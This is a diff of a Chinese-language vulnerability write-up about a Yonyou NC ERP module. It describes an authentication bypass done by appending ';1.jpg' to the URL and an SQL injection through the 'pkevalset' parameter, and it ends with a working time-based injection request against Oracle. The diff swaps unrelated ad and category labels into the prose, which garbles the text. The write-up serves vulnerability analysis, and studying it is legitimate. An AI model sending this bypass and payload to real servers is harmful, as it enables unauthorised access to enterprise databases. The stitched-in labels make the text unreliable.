@@ -61,15 +61,15 @@ public void init(FilterConfig arg0) throws ServletException {
 
 深入探索
 
-漏洞利用手册
+商务软件和生产力软件
 
-授权
+网络设备
 
-安全漏洞扫描工具
+软件
 
 我们只需要 URL 里有这些后缀或者url 就可以绕过权限校验
 
-漏洞利用分析
+企业资源规划
 
 根据官方漏洞通告
 
@@ -77,7 +77,7 @@ public void init(FilterConfig arg0) throws ServletException {
 
 直接看 `EvalScheduleController.java` 的业务逻辑处理
 
-企业资源规划
+计算机安全
 
 ```
 package nc.bs.ebvp.expeval;
@@ -167,7 +167,7 @@ public Object[] queryMDVOByPks(Class parentCls, String[] pks, DefaultTransBizExt
 
 最终通过GET请求，将 `pkevalset` 参数值拼接进SQL语句where子语句中调用 executeQuery 直接执行，无任何过滤或校验造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，朴实无华。
 
-计算机安全
+数据管理
 
 # 漏洞复现
 
@@ -175,7 +175,7 @@ public Object[] queryMDVOByPks(Class parentCls, String[] pks, DefaultTransBizExt
 
 漏洞利用示例
 
-数据管理
+编程
 
 ```
 GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1'+OR+1111%3d(SELECT+COUNT(*)+FROM+ALL_USERS+T1,ALL_USERS+T2,ALL_USERS+T3,ALL_USERS+T4,ALL_USERS+T5)-- HTTP/1.1
